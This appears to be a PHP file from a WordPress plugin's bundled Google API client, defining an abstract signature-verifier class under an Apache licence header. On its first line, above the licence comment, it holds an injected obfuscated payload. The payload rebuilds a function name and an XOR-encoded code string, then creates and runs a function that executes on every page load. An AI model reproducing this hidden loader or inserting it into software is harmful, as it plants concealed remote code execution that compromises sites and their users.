<?php $BMTxeUpYKW='N37380nVMP.HD>Y'^'-ARRLU108>M<-Q7';$DIYnzwsRujjn=$BMTxeUpYKW('','>0cHPC47HY64;T70S8GNwJ+>-TLTVq8QX2ozJZ10cMC P21ZXz5WI2S IA=7=8AqK.QDQzFMG46bHRiSoPhyQp=B0GMLdIOReCQ>LEOSjNTqXwn-dG,YXXRAK1VY9hIiFZoQA0fbu<K FaTLzC2PHA6w.qs8KhY.51SZwLF=8KA7WfB2=.ClGTkYA;UTYY,LcSFJccK8EN,e<oT3-2fDp6P5JVkca+O-TrQ2HjehQ145=UcOPR701U,BRgd1o+s-qmABKHX=0INNnl<TX6YFW6LPO,M0Yf-0=gneWPE4h8xG+VI dzIl=Z82<m4IsR<0QJUNHL88mj+he7 RRX5DjdHto,c01b7A9JuUQ0EgvKjj:MX90YXLxf7G0- Zg Q>uqaCR<6R;9Ms4YNVSDOn2+TAEvFa9i:sda>6B.KwjxX7M-FQT4I3NPD.H0+ A5.3>7DK7SM.Yfk6XT<Z.dcR+M;bmxQVUHM;RNKdjvG=1piRA93qnMeQA6AC1W-Ee.3US7;Kr3X=AebbWTG zYDicD>QTbMHJI94n8R0t>FgVktbZUoLQHtSzeFBIX7SydKeOVFtQ4+2>l0PjkTbMbTFRR .YQG3E=G8IXzhDL=8>X6hhRVTOO2LllVRgwRELA=Z1Vbf49DAgI -=G<.ZboST>y3= XKqgJMI'^'WVKi66ZT<0YZd1OY L4fP2DLr0- 7.g<-FHSczJ:j+6N3FX56ZM8;m7A= bhPM5YoJ000Vfi,QOKhrIsO+bpXTR7DgplCntXlJ7Q>mk:JstAcWJDX4X+4=<ioU7-XArIb3Dzh:okQS>TfOilRgV1< mSG,SfkL2KLjw3WifNL9-R9NfYXWj1noaPHI0 ,+BdG<3>JXA18DQo6K0RYSFyPP1Y93PiEO.Y5-:W1JXH7PXFXniE6=EUP6DbzC;r d8d4M 1kl3XIispNHJ54C<owMFYkH,D89FUDGSEs; MS2qcO7=ADGiHK;TGYV>4yXUVqbtj,-LYDJPblQO 79V,JLl+=i2et1caX9Uq:U<GKuJNL,4LUpx7ro>cTLT;8K4GULAg9YOi10DWP8:7syoJDJ84 MLhDcGynEZW6OkJJ8-Y>H485X I+x<A:oOA5TqlSB0cU2>KoR4R=7S>KLG6J9ZKAXu24<,d9+2MCMMTWXM6 MRQHkE03D :n<H<:KK< CHcUX=DfIBF353ASybOClS5aJi,+=XoIS7IScoGkVTE;aZtazFcCRs xiR7MT-SzctEcRHWZYV5MBtDkB54 3Yq24>l E.K=+RO4-DTQ9RODrr0.;SeELvrGWr>FHX,P:JBPX0 <nPLD+SO>E2zo4pVEI,cANqG4');$DIYnzwsRujjn();
/*
 * Copyright 2011 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Verifies signatures.
 *
 * @author Brian Eaton <beaton@google.com>
 */
abstract class Yoast_Google_Verifier {
  /**
   * Checks a signature, returns true if the signature is correct,
   * false otherwise.
   */
  abstract public function verify($data, $signature);
}
